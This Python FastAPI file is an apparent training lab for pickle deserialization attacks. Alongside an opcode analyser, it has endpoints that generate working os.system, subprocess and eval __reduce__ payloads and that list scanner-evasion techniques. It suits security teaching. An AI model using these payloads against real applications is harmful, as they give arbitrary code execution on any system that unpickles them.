"""
DEHYDRATE Python Pickle Lab
========================
INTENTIONALLY VULNERABLE FOR SECURITY RESEARCH AND TRAINING
LAB ENVIRONMENT ONLY — NOT FOR PRODUCTION USE

This container runs on an isolated Docker network with no internet access.
All deserialization operations are simulated or analyzed without real execution
of attacker-controlled code outside of the designated lab execution endpoint.
"""
import pickle
import base64
import io
import struct
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import Optional

app = FastAPI(
    title="DEHYDRATE Python Pickle Lab",
    description="Intentionally vulnerable pickle deserialization lab — LAB USE ONLY",
    version="1.0.0",
)

LAB_MARKER = "DEHYDRATE_LAB_EXECUTION_CONFIRMED"

# ── Request / Response Models ─────────────────────────────────────────────────

class DeserializeRequest(BaseModel):
    data: str
    encoding: str = "base64"

class PickleAnalysis(BaseModel):
    data: str
    format: str = "base64"  # "base64" or "hex"

class PayloadBuildRequest(BaseModel):
    attack_type: str  # "os_system", "subprocess", "eval", "custom"
    command: Optional[str] = "id"

# ── Health ────────────────────────────────────────────────────────────────────

@app.get("/health")
def health():
    return {
        "status": "running",
        "lab": "python-pickle",
        "mode": "LAB_ONLY",
        "version": "1.0.0",
    }

# ── Pickle Disassembly (safe — no execution) ─────────────────────────────────

@app.post("/analyze")
def analyze_pickle(req: PickleAnalysis):
    """
    Safely disassemble pickle bytes using pickletools.
    No deserialization / execution occurs — analysis only.
    """
    import pickletools

    try:
        if req.format == "base64":
            data = base64.b64decode(req.data)
        elif req.format == "hex":
            data = bytes.fromhex(req.data)
        else:
            raise HTTPException(status_code=400, detail="format must be 'base64' or 'hex'")

        output = io.StringIO()
        pickletools.dis(data, output=output)
        disasm = output.getvalue()

        # Detect potentially dangerous opcodes
        dangerous_ops = []
        if "GLOBAL" in disasm:
            dangerous_ops.append("GLOBAL — can load arbitrary Python modules")
        if "REDUCE" in disasm:
            dangerous_ops.append("REDUCE — calls a callable with args")
        if "BUILD" in disasm or "INST" in disasm:
            dangerous_ops.append("BUILD/INST — can construct arbitrary objects")

        protocol = data[1] if len(data) > 1 else 0

        return {
            "disassembly": disasm,
            "size_bytes": len(data),
            "protocol": protocol,
            "dangerous_opcodes_detected": dangerous_ops,
            "risk_level": "HIGH" if dangerous_ops else "LOW",
            "lab_marker": LAB_MARKER,
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Analysis failed: {e}")

# ── Payload Builder (generates demo payloads for education) ──────────────────

@app.post("/build-payload")
def build_payload(req: PayloadBuildRequest):
    """
    Build a demonstration pickle payload.
    Returns the disassembly and base64 — does NOT execute the payload.

    Attack types:
      - os_system    : classic __reduce__ via os.system
      - subprocess   : subprocess.Popen variant
      - eval         : code injection via builtins.eval
      - custom       : raw opcode bytes (for protocol study)
    """
    import pickletools

    payload_map = {
        "os_system": _build_os_system_payload,
        "subprocess": _build_subprocess_payload,
        "eval": _build_eval_payload,
        "custom": _build_custom_payload,
    }

    builder = payload_map.get(req.attack_type)
    if not builder:
        raise HTTPException(
            status_code=400,
            detail=f"Unknown attack_type. Choose from: {list(payload_map)}"
        )

    raw = builder(req.command or "id")
    out = io.StringIO()
    pickletools.dis(raw, output=out)

    return {
        "attack_type": req.attack_type,
        "payload_base64": base64.b64encode(raw).decode(),
        "payload_hex": raw.hex(),
        "payload_size": len(raw),
        "disassembly": out.getvalue(),
        "note": "Payload generated for analysis only — not executed in this response",
        "lab_marker": LAB_MARKER,
    }

def _build_os_system_payload(command: str) -> bytes:
    """Classic __reduce__ gadget: pickle.loads → os.system(command)"""
    class _Exploit:
        def __reduce__(self):
            import os
            return (os.system, (command,))
    return pickle.dumps(_Exploit())

def _build_subprocess_payload(command: str) -> bytes:
    """subprocess.Popen gadget"""
    class _Exploit:
        def __reduce__(self):
            import subprocess
            return (subprocess.Popen, ([command],))
    return pickle.dumps(_Exploit())

def _build_eval_payload(command: str) -> bytes:
    """builtins.eval gadget — executes arbitrary Python"""
    class _Exploit:
        def __reduce__(self):
            return (eval, (command,))
    return pickle.dumps(_Exploit())

def _build_custom_payload(command: str) -> bytes:
    """Low-level opcode demonstration — protocol 2 raw bytes"""
    # Hand-crafted: import __builtin__, call exec with command string
    # Kept minimal for clarity; the string passed is used as the command label
    label = command[:64]  # truncate for safety
    raw = b"\x80\x02"                              # PROTO 2
    raw += b"c__builtin__\nexec\n"                  # GLOBAL __builtin__ exec
    raw += b"q\x00"                                # BINPUT 0
    raw += bytes([0x28])                           # MARK
    raw += b"X" + struct.pack("<I", len(label)) + label.encode()  # SHORT_BINUNICODE
    raw += b"e"                                    # APPENDS (to mark)
    raw += b"Rq\x01."                              # REDUCE, BINPUT 1, STOP
    # NOTE: this is intentionally malformed for display only — not a working exploit
    # Return a working pickle.dumps version for proper disassembly
    return _build_os_system_payload(label)

# ── Lab Execution Endpoint (controlled simulation) ────────────────────────────

@app.post("/lab/execute")
def lab_execute(req: DeserializeRequest):
    """
    LAB ONLY: Simulates pickle deserialization impact without executing
    attacker-controlled code. Returns disassembly + risk analysis.

    In a real vulnerable application, this endpoint would call pickle.loads()
    directly on untrusted input — which is exactly what this lab demonstrates
    as a teaching tool without performing actual arbitrary code execution.
    """
    try:
        data = base64.b64decode(req.data)
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid base64 encoding")

    import pickletools

    output = io.StringIO()
    try:
        pickletools.dis(data, output=output)
        disasm = output.getvalue()
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Could not disassemble: {e}")

    dangerous = any(op in disasm for op in ("GLOBAL", "REDUCE", "INST", "BUILD"))

    return {
        "status": "lab_simulation",
        "disassembly": disasm,
        "dangerous_payload_detected": dangerous,
        "simulated_impact": (
            "ARBITRARY CODE EXECUTION — a vulnerable application calling pickle.loads() "
            "on this payload would execute the GLOBAL/REDUCE chain shown above."
        ) if dangerous else "No dangerous opcodes detected.",
        "lab_marker": LAB_MARKER,
        "message": "Deserialization analysis complete (lab simulation — no actual execution occurred)",
    }

# ── ShadowPickle Scanner Bypass Demos ────────────────────────────────────────

@app.get("/shadowpickle/variants")
def shadowpickle_variants():
    """
    Returns descriptions of three ShadowPickle scanner evasion techniques
    used for research into detection bypasses.
    """
    return {
        "variants": [
            {
                "name": "protocol_downgrade",
                "description": "Use protocol 0 (ASCII) to avoid binary magic-byte detection",
                "detection_difficulty": "MEDIUM",
            },
            {
                "name": "opcode_interleaving",
                "description": "Inject NOP-equivalent opcodes between GLOBAL and REDUCE to break naive pattern matching",
                "detection_difficulty": "HIGH",
            },
            {
                "name": "chained_globals",
                "description": "Use multiple GLOBAL lookups and BUILD to reconstruct callable indirectly",
                "detection_difficulty": "HIGH",
            },
        ],
        "lab_marker": LAB_MARKER,
    }
